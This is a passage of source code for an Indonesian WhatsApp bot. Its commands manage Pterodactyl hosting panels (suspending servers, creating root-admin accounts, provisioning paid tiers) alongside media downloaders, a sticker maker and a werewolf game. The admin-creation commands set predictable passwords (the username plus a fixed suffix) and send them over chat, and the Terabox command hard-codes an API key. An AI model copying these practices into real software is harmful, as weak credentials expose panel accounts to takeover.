NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
case 'suspend': {
            if (!TradID) return reply(`Khusus ${global.namabot} Ajah`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*BERHASIL SUSPEND..*')
        }
            break
            case 'unsuspend': {
            if (!TradID) return reply(`Khusus ${global.namabot} Ajah`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'cadmin':
case 'createadmin': {
if (!TradID) return replyviex(mess.only.owner)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return replyviex(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return replyviex(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return replyviex(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "46093"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await TradzSigma.sendMessage(m.chat, listMessage)

    await TradzSigma.sendMessage(nomornya, {

        text: `*🛒 BERIKUT AKUN ADMIN PANEL ANDA 🛒*\n
        
        
*👤 USERNAME:*  ${username}
*🔐  PASSWORD:* ${password}
*📡 LOGIN:* ${domain}


* Syarat & Ketentuan :
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!


`,

    })

}
break
case 'cadmin-v2':
case 'createadmin-v2': {
if (!TradID) return reply(mess.only.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "46093"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Admin",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: Admin

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

`
    const listMessage = {

        text: tks,

    }

	

    await TradzSigma.sendMessage(m.chat, listMessage)

    await TradzSigma.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n
USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain2}


*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        case 'listadmin': {
  if (!TradID) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await TradzSigma.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    replyviex(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "1gb":
case "2gb":
case "3gb":
case "4gb":
case "5gb":
case "6gb":
case "7gb":
case "8gb":
case "9gb":
case "10gb":
case "unlimited":
case "unli": {
    if (!TradID && !isPrem) return m.reply(mess.only.owner);

    const args = text.trim().split(" ");
    if (args.length < 2) return m.reply(`❌ Format salah!\nContoh: *.1gb 628xxxxxxx username*`);

    const nomor = args[0].replace(/[^0-9]/g, "");
    const username = args[1].toLowerCase().trim();

    if (!/^[0-9]{9,15}$/.test(nomor)) return m.reply(`❌ Nomor WhatsApp tidak valid!`);
    if (!/^[a-z0-9_]{3,20}$/.test(username)) return m.reply(`❌ Format username tidak valid!\nGunakan hanya huruf kecil, angka, dan underscore (3-20 karakter).`);

    const configs = {
        "1gb": { ram: 1000, disk: 1000, cpu: 40 },
        "2gb": { ram: 2000, disk: 1000, cpu: 60 },
        "3gb": { ram: 3000, disk: 2000, cpu: 80 },
        "4gb": { ram: 4000, disk: 2000, cpu: 100 },
        "5gb": { ram: 5000, disk: 3000, cpu: 120 },
        "6gb": { ram: 6000, disk: 3000, cpu: 140 },
        "7gb": { ram: 7000, disk: 4000, cpu: 160 },
        "8gb": { ram: 8000, disk: 4000, cpu: 180 },
        "9gb": { ram: 9000, disk: 5000, cpu: 200 },
        "10gb": { ram: 10000, disk: 5000, cpu: 220 },
        "unlimited": { ram: 0, disk: 0, cpu: 0 },
        "unli": { ram: 0, disk: 0, cpu: 0 }
    };

    const { ram, disk: disknya, cpu } = configs[command];
    const email = `${username}@gmail.com`;
    const password = `${username}${crypto.randomBytes(2).toString('hex')}`;
    const name = `${capital(username)} Server`;
    const serverLocation = parseInt(loc) || 1;

    try {
        // Buat user
        const userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Server",
                language: "en",
                password
            })
        });

        const userData = await userRes.json();
        if (userData.errors) {
            return m.reply(`❌ Gagal membuat user:\n${userData.errors.map(e => e.detail).join('\n')}`);
        }

        const userId = userData.attributes.id;

        // Ambil startup command
        const eggRes = await fetch(`${domain}/api/application/nests/${nestid}/eggs/${egg}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            }
        });

        const eggData = await eggRes.json();
        if (!eggData || !eggData.attributes || !eggData.attributes.startup) {
            // Hapus user kalau gagal dapat startup
            await fetch(`${domain}/api/application/users/${userId}`, {
                method: "DELETE",
                headers: {
                    "Authorization": `Bearer ${apikey}`
                }
            });
            return m.reply(`❌ Gagal mendapatkan data egg. Coba lagi nanti.`);
        }

        const startupCmd = eggData.attributes.startup;

        // Buat server
        const serverRes = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name,
                user: userId,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start"
                },
                limits: {
                    memory: ram,
                    swap: 0,
                    disk: disknya,
                    io: 500,
                    cpu
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 5
                },
                deploy: {
                    locations: [serverLocation],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });

        const serverData = await serverRes.json();
        if (serverData.errors) {
            // Hapus user kalau gagal buat server
            await fetch(`${domain}/api/application/users/${userId}`, {
                method: "DELETE",
                headers: {
                    "Authorization": `Bearer ${apikey}`
                }
            });
            return m.reply(`❌ Gagal membuat server:\n${serverData.errors.map(e => e.detail).join('\n')}`);
        }

        // Kirim info akun
        const recipient = nomor.includes("@s.whatsapp.net") ? nomor : `${nomor}@s.whatsapp.net`;
        const panelMsg = `
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        ✨ *DATA AKUN PANEL ANDA* ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📡 *ID Server:* ${serverData.attributes.id}  
👤 *Username:* ${username}  
🔐 *Password:* ${password}  
🌐 *Spesifikasi Server*
- *RAM:* ${ram === 0 ? 'Unlimited' : (ram / 1000) + 'GB'}
- *Disk:* ${disknya === 0 ? 'Unlimited' : (disknya / 1000) + 'GB'}
- *CPU:* ${cpu === 0 ? 'Unlimited' : cpu + '%'}

*${domain}*

📜 *Syarat & Ketentuan:*
• Masa aktif akun: 30 hari
• Simpan data ini dengan aman
• Jangan menghapus server sembarangan
• Pelanggaran akan berakibat penghapusan akun
`;

        await m.reply("✅ *Berhasil membuat panel!*\nDetail akun telah dikirim ke user.");
        await TradzSigma.sendMessage(recipient, { text: panelMsg }, { quoted: qloc });

    } catch (e) {
        console.error("Global Error:", e);
        return m.reply("❌ Terjadi kesalahan sistem. Silakan coba lagi nanti.");
    }

    break;
}
case "1gb-v2":
case "2gb-v2":
case "3gb-v2":
case "4gb-v2":
case "5gb-v2":
case "6gb-v2":
case "7gb-v2":
case "8gb-v2":
case "9gb-v2":
case "10gb-v2":
case "unlimited-v2":
case "unli-v2": {
    if (!TradID && !isPrem) return m.reply(mess.only.owner);

    const args = text.trim().split(" ");
    if (args.length < 2) return m.reply(`❌ Format salah!\nContoh: *.1gb-v2 628xxxxxxx username*`);

    const nomor = args[0].replace(/[^0-9]/g, "");
    const username = args[1].toLowerCase().trim();

    if (!/^[0-9]{9,15}$/.test(nomor)) return m.reply(`❌ Nomor WhatsApp tidak valid!`);
    if (!/^[a-z0-9_]{3,20}$/.test(username)) return m.reply(`❌ Format username tidak valid!\nGunakan hanya huruf kecil, angka, dan underscore (3-20 karakter).`);

    const configs = {
        "1gb-v2": { ram: 1000, disk: 1000, cpu: 40 },
        "2gb-v2": { ram: 2000, disk: 1000, cpu: 60 },
        "3gb-v2": { ram: 3000, disk: 2000, cpu: 80 },
        "4gb-v2": { ram: 4000, disk: 2000, cpu: 100 },
        "5gb-v2": { ram: 5000, disk: 3000, cpu: 120 },
        "6gb-v2": { ram: 6000, disk: 3000, cpu: 140 },
        "7gb-v2": { ram: 7000, disk: 4000, cpu: 160 },
        "8gb-v2": { ram: 8000, disk: 4000, cpu: 180 },
        "9gb-v2": { ram: 9000, disk: 5000, cpu: 200 },
        "10gb-v2": { ram: 10000, disk: 5000, cpu: 220 },
        "unlimited-v2": { ram: 0, disk: 0, cpu: 0 },
        "unli-v2": { ram: 0, disk: 0, cpu: 0 }
    };

    const { ram, disk: disknya, cpu } = configs[command];
    const email = `${username}@gmail.com`;
    const password = `${username}${crypto.randomBytes(2).toString('hex')}`;
    const name = `${capital(username)} Server`;
    const serverLocation = parseInt(loc) || 1;

    try {
        // Buat user
        const userRes = await fetch(`${domain2}/api/application/users`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey2}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Server",
                language: "en",
                password
            })
        });

        const userData = await userRes.json();
        if (userData.errors) {
            return m.reply(`❌ Gagal membuat user:\n${userData.errors.map(e => e.detail).join('\n')}`);
        }

        const userId = userData.attributes.id;

        // Ambil startup command
        const eggRes = await fetch(`${domain2}/api/application/nests/${nestid2}/eggs/${egg2}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey2}`
            }
        });

        const eggData = await eggRes.json();
        if (!eggData || !eggData.attributes || !eggData.attributes.startup) {
            // Hapus user kalau gagal dapat startup
            await fetch(`${domain2}/api/application/users/${userId}`, {
                method: "DELETE",
                headers: {
                    "Authorization": `Bearer ${apikey2}`
                }
            });
            return m.reply(`❌ Gagal mendapatkan data egg. Coba lagi nanti.`);
        }

        const startupCmd = eggData.attributes.startup;

        // Buat server
        const serverRes = await fetch(`${domain2}/api/application/servers`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey2}`
            },
            body: JSON.stringify({
                name,
                user: userId,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start"
                },
                limits: {
                    memory: ram,
                    swap: 0,
                    disk: disknya,
                    io: 500,
                    cpu
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 5
                },
                deploy: {
                    locations: [serverLocation],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });

        const serverData = await serverRes.json();
        if (serverData.errors) {
            // Hapus user kalau gagal buat server
            await fetch(`${domain2}/api/application/users/${userId}`, {
                method: "DELETE",
                headers: {
                    "Authorization": `Bearer ${apikey2}`
                }
            });
            return m.reply(`❌ Gagal membuat server:\n${serverData.errors.map(e => e.detail).join('\n')}`);
        }

        // Kirim info akun
        const recipient = nomor.includes("@s.whatsapp.net") ? nomor : `${nomor}@s.whatsapp.net`;
        const panelMsg = `
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        ✨ *DATA AKUN PANEL ANDA* ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📡 *ID Server:* ${serverData.attributes.id}  
👤 *Username:* ${username}  
🔐 *Password:* ${password}  
🌐 *Spesifikasi Server*
- *RAM:* ${ram === 0 ? 'Unlimited' : (ram / 1000) + 'GB'}
- *Disk:* ${disknya === 0 ? 'Unlimited' : (disknya / 1000) + 'GB'}
- *CPU:* ${cpu === 0 ? 'Unlimited' : cpu + '%'}

*${domain}*

📜 *Syarat & Ketentuan:*
• Masa aktif akun: 30 hari
• Simpan data ini dengan aman
• Jangan menghapus server sembarangan
• Pelanggaran akan berakibat penghapusan akun
`;

        await m.reply("✅ *Berhasil membuat panel!*\nDetail akun telah dikirim ke user.");
        await TradzSigma.sendMessage(recipient, { text: panelMsg }, { quoted: qloc });

    } catch (e) {
        console.error("Global Error:", e);
        return m.reply("❌ Terjadi kesalahan sistem. Silakan coba lagi nanti.");
    }

    break;
}
case "hdvideo":
case "hdvid": {
    const ffmpeg = require('fluent-ffmpeg');
    const ffmpegStatic = require('ffmpeg-static');
    const { writeFile, unlink, mkdir } = require('fs').promises;
    const { existsSync } = require('fs');
    const path = require('path');

    if (!ffmpegStatic) {
        return TradzSigma.sendMessage(m.chat, { text: "❌ FFMPEG tidak ditemukan! Pastikan sudah diinstal dengan benar." }, { quoted: m });
    }
    ffmpeg.setFfmpegPath(ffmpegStatic);
    let inputPath, outputPath;
    try {
        let q = m.quoted || m;
        let mime = q.mimetype || q.msg?.mimetype || q.mediaType || "";
        if (!mime) return TradzSigma.sendMessage(m.chat, { text: "❌ Mana videonya?" }, { quoted: m });
        if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
            return TradzSigma.sendMessage(m.chat, { text: `❌ Format ${mime} tidak didukung!` }, { quoted: m });
        }
        TradzSigma.sendMessage(m.chat, { text: "⏳ Sedang memproses video, mohon tunggu sekitar 2 - 4 menit..." }, { quoted: m });
        let videoBuffer = await q.download?.();
        if (!videoBuffer) return TradzSigma.sendMessage(m.chat, { text: "❌ Gagal mengunduh video!" }, { quoted: m });
        let tempDir = path.join(__dirname, 'tmp');
        if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });
        inputPath = path.join(tempDir, `input_${Date.now()}.mp4`);
        outputPath = path.join(tempDir, `output_${Date.now()}.mp4`);
        await writeFile(inputPath, videoBuffer);
        await new Promise((resolve, reject) => {
            ffmpeg(inputPath)
                .outputOptions([
                    '-vf', 'scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
                    '-r', '60',
                    '-preset', 'faster',
                    '-crf', '25',
                    '-c:v', 'libx264',
                    '-pix_fmt', 'yuv420p',
                    '-c:a', 'aac',
                    '-b:a', '128k'
                ])
                .on('end', resolve)
                .on('error', reject)
                .save(outputPath);
        });
        await TradzSigma.sendMessage(m.chat, { 
            video: { url: outputPath },
            caption: "✅ Video berhasil ditingkatkan kualitasnya!"
        }, { quoted: m });
    } catch (err) {
        console.error("Error HD Video:", err);
        TradzSigma.sendMessage(m.chat, { text: "❌ Gagal meningkatkan kualitas video." }, { quoted: m });
    } finally {
        setTimeout(() => {
            if (inputPath) unlink(inputPath).catch(() => {});
            if (outputPath) unlink(outputPath).catch(() => {});
        }, 5000);
    }
}
break
//==================================================================
case 'terabox':
case 'teraboxdl': {
  if(!text) return reply('linknya mana kak')
replyviex(mess.wait)
  const response = await fetch(`https://api.alyachan.dev/api/terabox?url=${encodeURIComponent(text)}&apikey=DinzIDgembul`);
const data = await response.json();
const downloadLink = data.data.url;
const caption = data.data.filename;
const responseHeaders = response.headers;
const mimeType = responseHeaders.get('content-type');
TradzSigma.sendMessage(m.chat, { document: { url: downloadLink, mimetype: mimeType }, fileName: caption }, { quoted: m });

}
break
//==================================================================
case 'capcutdl':case 'cc': case 'capcut': {
const axios = require('axios')
function download(url) {
  return new Promise(async(resolve, reject) => {
    try {
      let cc = await axios.get(url, {
        headers: {
          'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
        }
      }).then(x => x.data)
      
      let dataMatch = /<script nonce="argus-csp-token">window\._ROUTER_DATA = (.*?)<\/script>/;
      if (cc.match(dataMatch)) {
        let getJson = JSON.parse(cc.match(dataMatch)[1]).loaderData['template-detail_$'].templateDetail
        if (getJson.templateId) {
          resolve({ status: true, mess: `Berhasil mengambil data`, data: getJson })
        } else {
          resolve({ status: false, mess: `Tidak ada metadata tersedia`})
        }
      }
    } catch(e) {
      reject({ status: false, mess: `Gagal mengambil metadata`})
    }
  })
}
if (!text.includes('www.capcut.net')) return replyviex('masukan link cc!!')
let hasil = await download(text)
try {
let deku = `⏤͟͟͞͞╳── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴄᴄ ]* ── .々─ᯤ\n`
deku += `│    =〆 ᴛɪᴛʟᴇ: ${hasil.data.title}\n`
deku += `│    =〆 ᴅᴇsᴄ: ${hasil.data.desc}\n`
deku += `│    =〆 ɪᴅ: ${hasil.data.templateId}\n`
deku += `│    =〆 ᴜʀʟ: ${hasil.data.structuredData.url}\n`
deku += `⏤͟͟͞͞╳────────── .✦`
await TradzSigma.sendMessage(m.chat, { video: { url: hasil.data.videoUrl }, caption: deku }, { quoted: m })
} catch (e) {
 replyviex('error kak...')
}

}
break
case 'brat2': {
const { createCanvas, registerFont } = require('canvas');
const Jimp = require('jimp');
async function BratGenerator(teks) {
  let width = 512;
  let height = 512;
  let margin = 20;
  let wordSpacing = 50; 
  let canvas = createCanvas(width, height);
  let ctx = canvas.getContext('2d');
  ctx.fillStyle = 'white';
  ctx.fillRect(0, 0, width, height);
  let fontSize = 280;
  let lineHeightMultiplier = 1.3;
  ctx.textAlign = 'left';
  ctx.textBaseline = 'top';
  ctx.fillStyle = 'black';
registerFont('./lib/arialnarrow.ttf', { family: 'Narrow' });
  let words = teks.split(' ');
  let lines = [];
  let rebuildLines = () => {
    lines = [];
    let currentLine = '';
    for (let word of words) {
      let testLine = currentLine ? `${currentLine} ${word}` : word;
      let lineWidth =
        ctx.measureText(testLine).width + (currentLine.split(' ').length - 1) * wordSpacing;
      if (lineWidth < width - 2 * margin) {
        currentLine = testLine;
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    }
    if (currentLine) {
      lines.push(currentLine);
    }
  };
  ctx.font = `${fontSize}px Narrow`;
  rebuildLines();
  while (lines.length * fontSize * lineHeightMultiplier > height - 2 * margin) {
    fontSize -= 2;
    ctx.font = `${fontSize}px Narrow`;
    rebuildLines();
  }
    let lineHeight = fontSize * lineHeightMultiplier;
  let y = margin;
  for (let line of lines) {
    let wordsInLine = line.split(' ');
    let x = margin;
    for (let word of wordsInLine) {
      ctx.fillText(word, x, y);
      x += ctx.measureText(word).width + wordSpacing;
    }
    y += lineHeight;
  }
  let buffer = canvas.toBuffer('image/png');
  let image = await Jimp.read(buffer);
  image.blur(3);
  let blurredBuffer = await image.getBufferAsync(Jimp.MIME_PNG);
return TradzSigma.sendImageAsSticker(m.chat, blurredBuffer, m, { packname: "DinzID Chx", author: "DinzID Chx|Yoimiya-Ai" })
}
if (!text) return replyviex(`Masukkan teks untuk stiker.\n\nContoh:\n.brat Atmin Ganteng`);
return BratGenerator(text)
}
break
//==================================================================
case 'ww':
case 'werewolf': {
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    TradzSigma.werewolf = TradzSigma.werewolf ? TradzSigma.werewolf : {};
    const ww = TradzSigma.werewolf ? TradzSigma.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];

    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return replyviex("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return replyviex("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await replyviex("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return replyviex("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return replyviex("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return replyviex("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return replyviex("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return replyviex("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        TradzSigma.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return replyviex("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return replyviex("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return replyviex("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return replyviex("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(TradzSigma, chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(TradzSigma, chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_pagi(TradzSigma, chat, ww);
            }
        }
        if (ww[chat].status === true)
            return replyviex("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return m.reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${TradzSigma.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Kill Player ${ww[chat].player[p].number}`,
                        rowId: `.wwpc kill ${ww[chat].player[p].number}`,
                        description: `Untuk membunuh player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await TradzSigma.sendMessage(ww[chat].player[i].id, listMessage);
                   
                    await TradzSigma.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }

                // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${TradzSigma.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await TradzSigma.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${TradzSigma.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
